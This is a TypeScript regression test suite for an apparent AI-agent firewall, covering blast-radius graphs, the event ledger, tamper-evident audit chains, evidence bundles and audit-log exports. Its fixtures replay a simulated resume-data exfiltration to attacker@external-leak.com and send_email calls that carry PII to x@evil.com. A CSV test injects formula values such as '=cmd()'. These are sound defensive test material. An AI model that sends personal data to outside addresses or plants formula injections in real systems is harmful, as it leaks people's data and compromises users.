import fs from 'node:fs';
import path from 'node:path';
import { auditToCsv, auditToJsonl, AuditHashChain, filterAuditEntries } from '../auditLog.ts';
import { buildBlastRadius, buildReportDrafts, buildTimeline } from '../blastRadius.ts';
import { buildEvidenceBundle, verifyEvidenceBundle } from '../evidence.ts';
import { EventLedger } from '../ledger.ts';
import { IncidentStore } from '../incidentStore.ts';
import { SEEDED_SCENARIOS } from '../scenarios.ts';
import type { Incident } from '../types.ts';
import { eq, JWT_LIKE, makeServiceStack, playScenario, skip, suite, tmpDir, yes } from './helpers.ts';

const scenario = (id: string) => SEEDED_SCENARIOS.find((s) => s.id === id)!;
const src = (rel: string) => {
  const f = path.resolve(process.cwd(), rel);
  return fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : null;
};
const graphOf = (st: ReturnType<typeof makeServiceStack>, sessionId: string) =>
  buildBlastRadius(st.ledger.bySession(sessionId), { sessionId, outbox: st.toolServer.getOutbox(), refunds: st.toolServer.getRefunds() });

export const blastCases = suite(12, 'Regression 12: Blast radius, ledger, evidence, logs', [
  // ---- blast radius from the ledger
  ['no hard-coded nodes: template labels are gone from the sources', () => {
    const a = src('server/blastRadius.ts');
    const b = src('server/incidentResponse.ts');
    if (!a || !b) return skip('source not available');
    return yes(!/Candidate Database|data_candidate_dossiers|dest_external|external-sink/.test(a + b));
  }],
  ['no events => only the session node and an explanatory note (nothing is invented)', () => {
    const g = buildBlastRadius([], { sessionId: 'sess_empty' });
    return eq({ nodes: ['session'], edges: 0, note: true }, { nodes: g.nodes.map((n) => n.type), edges: g.edges.length, note: Boolean(g.note) });
  }],
  ['blocked exfiltration (S1, isolated): nodes come from real events with true statuses', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'));
    const g = graphOf(st, session.id);
    const byType = (t: string) => g.nodes.filter((n) => n.type === t);
    const dest = byType('outbound_destination')[0];
    const data = byType('data_object')[0];
    const callEdge = g.edges.find((e) => e.target === dest.id)!;
    return eq(
      { src: 1, calls: 2, data: 'CAND_101', destStatus: 'blocked', edgeStatus: 'blocked', classes: true, tokenRedeemed: true, hasAgentNodeOrTemplate: false },
      {
        src: byType('untrusted_source').length,
        calls: byType('tool_call').length,
        data: data.label,
        destStatus: dest.status,
        edgeStatus: callEdge.status,
        classes: Object.keys((data.metadata as any).dataClasses).length > 0,
        tokenRedeemed: byType('token').some((t) => t.status === 'allowed'),
        hasAgentNodeOrTemplate: g.nodes.some((n) => /Database|external-sink/.test(n.label)),
      }
    );
  }],
  ['data classes on a data object are counted by the real PII detectors (PAN / phone from the tool result)', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'));
    const data = graphOf(st, session.id).nodes.find((n) => n.type === 'data_object')!;
    const classes = (data.metadata as any).dataClasses as Record<string, number>;
    // the masked Aadhaar fixture fails the Verhoeff checksum, so it is (correctly) not counted
    return yes((classes.PAN ?? 0) >= 1 && (classes.PHONE ?? 0) >= 1, JSON.stringify(classes));
  }],
  ['"what left the premises" comes from the outbox record (legacy simulation, firewall OFF): recipients, bytes, classes, record counts', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'), 'off');
    const g = graphOf(st, session.id);
    const left = g.summary.leftPremises;
    const outbox = st.toolServer.getOutbox()[0];
    return eq(
      { recipients: ['attacker@external-leak.com'], bytes: outbox.bytes, source: 'outbox-record', matched: 1, classes: true, touched: 1, destStatus: 'allowed', sim: true },
      { recipients: left.recipients, bytes: left.totalBytes, source: left.items[0].source, matched: g.generatedFrom.outboxRecordsMatched, classes: Object.keys(left.dataClasses).length > 0, touched: left.recordsTouchedInSession, destStatus: g.nodes.find((n) => n.type === 'outbound_destination')!.status, sim: /legacy pattern/.test(String(left.items[0].simulation)) }
    );
  }],
  ['refunds that left the premises come from the refund record', async () => {
    const st = makeServiceStack();
    const s = st.service.createSession({ agentId: 'a', firewallMode: 'enforce' });
    await st.service.execute({ sessionId: s.id, toolCall: { tool: 'issue_refund', args: { amount: 500, upiId: 'cust@okaxis' } } });
    const g = graphOf(st, s.id);
    return eq({ payees: ['cust@okaxis'], total: 500, source: 'refund-record', matched: 1 }, { payees: g.summary.leftPremises.payees, total: g.summary.leftPremises.totalRefundAmount, source: g.summary.leftPremises.items[0].source, matched: g.generatedFrom.refundRecordsMatched });
  }],
  ['"what was prevented" is computed from denied calls: rule, destination, data classes that would have been sent', async () => {
    const st = makeServiceStack();
    const s = st.service.createSession({ agentId: 'a', firewallMode: 'enforce' });
    await st.service.execute({ sessionId: s.id, toolCall: { tool: 'send_email', args: { to: 'x@evil.com', subject: 's', body: 'PAN ABCDE1234F and mail rohan@example.com' } } });
    const p = graphOf(st, s.id).summary.prevented;
    return eq({ denied: 1, recipient: ['x@evil.com'], rule: 'R3_DOMAIN_ALLOWLIST', classes: true }, { denied: p.denied, recipient: p.items[0].recipients, rule: p.items[0].ruleId, classes: Object.keys(p.dataClasses).length > 0 });
  }],
  ['pending approvals show as pending nodes/edges, then allowed after approval', async () => {
    const st = makeServiceStack();
    const s = st.service.createSession({ agentId: 'a', firewallMode: 'enforce' });
    const o = await st.service.execute({ sessionId: s.id, toolCall: { tool: 'issue_refund', args: { amount: 5000, upiId: 'c@okaxis' } } });
    const pending = graphOf(st, s.id);
    st.service.resolveApproval(o.approvalId!, 'APPROVE');
    const done = graphOf(st, s.id);
    const status = (g: typeof pending) => g.nodes.find((n) => n.type === 'outbound_destination')!.status;
    return eq({ before: 'pending', pendingCount: 1, after: 'allowed' }, { before: status(pending), pendingCount: pending.summary.prevented.pendingApproval, after: status(done) });
  }],
  ['revoked tokens appear with status "revoked" (kill switch) and expired tokens as "expired"', async () => {
    const st = makeServiceStack();
    const s = st.service.createSession({ agentId: 'agent_k', firewallMode: 'enforce' });
    st.broker.issueToken({ sessionId: s.id, agentId: 'agent_k', toolCall: { tool: 'issue_refund', args: { amount: 1, upiId: 'a@okaxis' } } });
    st.broker.revokeAgent('agent_k');
    st.broker.issueToken({ sessionId: s.id, agentId: 'agent_k', toolCall: { tool: 'lookup_order', args: { orderId: 'ORD-8819' } } });
    st.clock.t += 61_000;
    st.broker.sweepExpired(st.clock.t);
    const statuses = graphOf(st, s.id).nodes.filter((n) => n.type === 'token').map((n) => n.status).sort();
    return eq(['expired', 'revoked'], statuses);
  }],
  // ---- replay
  ['replay timeline uses the real event timestamps (offsets are differences of ledger timestamps)', async () => {
    const st = makeServiceStack();
    const s = st.service.createSession({ agentId: 'a', firewallMode: 'enforce' });
    st.clock.t += 500;
    await st.service.execute({ sessionId: s.id, toolCall: { tool: 'lookup_order', args: { orderId: 'ORD-8819' } } });
    st.clock.t += 1500;
    await st.service.execute({ sessionId: s.id, toolCall: { tool: 'send_email', args: { to: 'x@evil.com', subject: 's', body: 'b' } } });
    const events = st.ledger.bySession(s.id);
    const steps = buildTimeline(events);
    const expected = events.map((e) => Date.parse(e.ts) - Date.parse(events[0].ts));
    return eq({ offsets: expected, steps: events.length, monotonic: true, hasGap: true }, { offsets: steps.map((x) => x.timeOffsetMs), steps: steps.length, monotonic: steps.every((x, i) => i === 0 || x.timeOffsetMs >= steps[i - 1].timeOffsetMs), hasGap: steps.some((x) => x.timeOffsetMs >= 1500) });
  }],
  ['replay UI has play, pause and step controls', () => {
    const t = src('src/features/incident/ReplayTimeline.tsx');
    if (!t) return skip('source not available');
    return yes(/Play/.test(t) && /Pause/.test(t) && /Step/.test(t) && /timeOffsetMs/.test(t));
  }],
  // ---- ledger + persistence
  ['every ledger event is committed in the keyed audit chain; tampering with an event or its commitment is detected', async () => {
    const st = makeServiceStack();
    await playScenario(st, scenario('s1_hr_resume_exfil'));
    const ok = st.ledger.verify();
    (st.ledger.all()[2].data as Record<string, unknown>).tampered = true; // all() copies the array, objects are shared
    const bad = st.ledger.verify();
    return eq({ ok: true, checked: st.ledger.all().length > 5, badDetected: true }, { ok: ok.ok, checked: ok.checked > 5, badDetected: !bad.ok && bad.mismatches.length === 1 });
  }],
  ['restart keeps ledger events: reload from JSONL and verify against the reloaded audit chain', async () => {
    const dir = tmpDir();
    const a = makeServiceStack({ dir });
    await playScenario(a, scenario('s1_hr_resume_exfil'));
    const count = a.ledger.all().length;
    const audit2 = new AuditHashChain({ dir, key: a.key, quiet: true, anchorEvery: 5 });
    const ledger2 = new EventLedger({ dir, audit: audit2 });
    const v = ledger2.verify();
    ledger2.record({ sessionId: 'after', type: 'LLM_RESPONSE', data: {} });
    return eq({ count, ok: true, auditValid: true, next: count + 1 }, { count: ledger2.all().length - 1, ok: v.ok, auditValid: audit2.verifyChain().valid, next: ledger2.all().length });
  }],
  ['restart keeps incidents (JSONL, last write wins); seeded samples are not persisted', () => {
    const dir = tmpDir();
    const inc = { id: 'sess_1', timestamp: new Date().toISOString(), scenarioId: 's', scenarioTitle: 't', decision: { action: 'deny' }, segments: [], findings: [], notices: [] } as unknown as Incident;
    const a = new IncidentStore({ dir });
    a.upsert(inc);
    a.upsert({ ...inc, dataLeftPremises: true });
    a.setTransient({ ...inc, id: 'inc_seed', isSeeded: true });
    const b = new IncidentStore({ dir });
    return eq({ ids: ['sess_1'], updated: true }, { ids: b.all().map((x) => x.id), updated: b.get('sess_1')?.dataLeftPremises });
  }],
  ['audit key file is created even when AUDIT_DIR does not exist yet (first boot)', () => {
    const dir = path.join(tmpDir(), 'does', 'not', 'exist');
    const c = new AuditHashChain({ dir, quiet: true });
    return yes(c.verifyChain().valid && fs.existsSync(path.join(dir, 'audit.key')));
  }],
  // ---- evidence bundle
  ['evidence bundle: events, audit entries with proofs, anchors, blast radius, timeline and drafts; verifies offline', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'));
    for (let i = 0; i < 6; i++) st.audit.appendEntry({ type: 'LEDGER_EVENT', sessionId: 'filler', data: { i } });
    const bundle = buildEvidenceBundle({ ledger: st.ledger, audit: st.audit, outbox: st.toolServer.getOutbox(), refunds: st.toolServer.getRefunds() }, session.id);
    const v = verifyEvidenceBundle(bundle);
    return eq(
      { ok: true, events: true, entries: bundle.events.length, anchors: true, proof: true, graph: true, drafts: true, timeline: true },
      { ok: v.ok, events: bundle.events.length > 5, entries: bundle.auditEntries.length, anchors: bundle.anchors.length > 0, proof: bundle.auditEntries.every((a) => a.proof.entryHashValid && a.proof.linkValid), graph: bundle.blastRadius.nodes.length > 3, drafts: Boolean(bundle.reportDrafts.disclaimer), timeline: bundle.timeline.length === bundle.events.length }
    );
  }],
  ['evidence bundle: tampering with an event, a commitment or the digest is detected offline', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'));
    const mk = () => JSON.parse(JSON.stringify(buildEvidenceBundle({ ledger: st.ledger, audit: st.audit, outbox: [], refunds: [] }, session.id)));
    const a = mk();
    a.events[3].data.tampered = 1;
    const b = mk();
    b.auditEntries[2].entry.data.digest = 'f'.repeat(64);
    const c = mk();
    c.sessionId = 'other';
    return eq([false, false, false], [verifyEvidenceBundle(a).ok, verifyEvidenceBundle(b).ok, verifyEvidenceBundle(c).ok]);
  }],
  ['evidence bundle never contains token strings or vault secrets', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'), 'off');
    const text = JSON.stringify(buildEvidenceBundle({ ledger: st.ledger, audit: st.audit, outbox: st.toolServer.getOutbox(), refunds: [] }, session.id));
    return eq({ jwt: false, leaks: [] }, { jwt: JWT_LIKE.test(text), leaks: st.vault.findLeaks(text) });
  }],
  ['report drafts are populated from computed data, keep the disclaimer and assert no legal deadline', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'), 'off');
    const events = st.ledger.bySession(session.id);
    const g = graphOf(st, session.id);
    const d = buildReportDrafts(session.id, events, g);
    const text = JSON.stringify(d);
    return eq(
      { disclaimer: true, recipient: true, classes: true, bytes: true, noDeadline: true },
      { disclaimer: /Not legal advice/.test(d.disclaimer), recipient: text.includes('attacker@external-leak.com'), classes: d.dpdpDraft.compromisedDataElements.some((x) => /PAN|PHONE/.test(x)), bytes: text.includes(String(g.summary.leftPremises.totalBytes)), noDeadline: !/within \d+ hours|6 hours|72 hours/i.test(text) }
    );
  }],
  // ---- logs page back end
  ['logs: filters (session, rule, tool, decision, date, type, search) narrow the entries', async () => {
    const st = makeServiceStack();
    const { session } = await playScenario(st, scenario('s1_hr_resume_exfil'));
    const all = st.audit.getEntries();
    const f = (q: object) => filterAuditEntries(all, q).length;
    const midTs = all[Math.floor(all.length / 2)].ts;
    return eq(
      { session: true, rule: true, tool: true, decision: true, dateIn: true, dateOut: 0, search: true, type: true },
      {
        session: f({ sessionId: session.id }) === all.filter((e) => e.sessionId === session.id).length,
        rule: f({ ruleId: 'R3_DOMAIN_ALLOWLIST' }) >= 0 && filterAuditEntries(all, { ruleId: 'R6_RISK_ADAPTIVE_GATE' }).concat(filterAuditEntries(all, { ruleId: 'R2_TRIFECTA' })).length > 0,
        tool: f({ tool: 'send_email' }) > 0 && filterAuditEntries(all, { tool: 'send_email' }).every((e) => (e.data as any).tool === 'send_email'),
        decision: filterAuditEntries(all, { decision: 'deny' }).length === 1,
        dateIn: f({ from: midTs }) > 0,
        dateOut: f({ from: new Date(Date.now() + 86_400_000).toISOString() }),
        search: f({ search: 'CAND_101' }) >= 0 && f({ search: 'definitely-not-present-xyz' }) === 0,
        type: f({ type: 'TOKEN_ISSUED' }) === 1,
      }
    );
  }],
  ['logs: pagination returns the right slice and total, newest first', async () => {
    const st = makeServiceStack();
    await playScenario(st, scenario('s1_hr_resume_exfil'));
    const total = st.audit.getEntries().length;
    const p1 = st.audit.query({ page: 1, pageSize: 5 });
    const p2 = st.audit.query({ page: 2, pageSize: 5 });
    return eq({ total, n1: 5, first: total - 1, secondFirst: total - 6 }, { total: p1.total, n1: p1.items.length, first: p1.items[0].seq, secondFirst: p2.items[0].seq });
  }],
  ['logs: "verify this entry" returns recomputed hash status, hash path to the next anchor and the anchor check', async () => {
    const st = makeServiceStack();
    await playScenario(st, scenario('s1_hr_resume_exfil')); // anchors every 5 entries in this stack
    const proof = st.audit.proveEntry(1)!;
    const last = st.audit.getEntries().length - 1;
    const tail = st.audit.proveEntry(last)!;
    return eq(
      { hash: true, link: true, path: true, anchor: true, covered: true, tailCovered: false, note: true },
      { hash: proof.entryHashValid, link: proof.linkValid, path: proof.path.length > 1 && proof.path[0].seq === 1 && proof.path[proof.path.length - 1].seq === proof.anchor!.seq, anchor: proof.anchorSigValid && proof.anchorMatches, covered: proof.covered, tailCovered: tail.covered, note: /witness simulation/.test(tail.note) }
    );
  }],
  ['logs: an edited entry fails its own proof', async () => {
    const st = makeServiceStack();
    await playScenario(st, scenario('s1_hr_resume_exfil'));
    st.audit.tamperEntry(2, { forged: true });
    const p = st.audit.proveEntry(2)!;
    return eq({ hash: false, covered: false }, { hash: p.entryHashValid, covered: p.covered });
  }],
  ['logs: JSONL export has one parseable line per entry; CSV has a header, escapes quotes and guards formulas', async () => {
    const st = makeServiceStack();
    st.audit.appendEntry({ type: 'LEDGER_EVENT', sessionId: '=cmd()', data: { note: 'say "hi", ok', tool: '=1+1' } });
    const items = st.audit.getEntries();
    const jsonl = auditToJsonl(items).trim().split('\n').map((l) => JSON.parse(l));
    const csv = auditToCsv(items).split('\n');
    return eq({ lines: items.length, header: 'seq,ts,type,sessionId,ruleId,tool,decision,hash,prevHash,data', formula: true, quotes: true }, { lines: jsonl.length, header: csv[0], formula: csv[csv.length - 2].includes(`"'=cmd()"`), quotes: csv[csv.length - 2].includes('say \\""hi\\""') });
  }],
  ['logs page exposes search, filters, pagination, per-entry verification, banner and exports', () => {
    const t = src('src/components/pages/AuditPage.tsx');
    if (!t) return skip('source not available');
    return yes(/Verify this entry/.test(t) && /Export JSONL/.test(t) && /Export CSV/.test(t) && /pageSize|Page /.test(t) && /search/i.test(t) && /ruleId/.test(t) && /sessionId/.test(t) && /decision/.test(t));
  }],
]);
